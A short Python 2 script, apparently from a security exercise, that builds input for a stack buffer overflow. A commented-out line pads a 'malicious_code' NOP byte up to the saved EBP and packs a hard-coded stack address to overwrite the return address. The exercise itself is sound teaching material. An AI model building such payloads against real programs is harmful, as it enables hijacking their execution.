from struct import pack

name = 0xbffff2e0
ebp = 0xbffff328
malicious_code = "\x90"

print "MP1" + "\x00"*(32-3) + "musical instrument digimon"

#print malicious_code + "\x00"*(ebp-name+4-len(malicious_code)) + pack('<I',name)

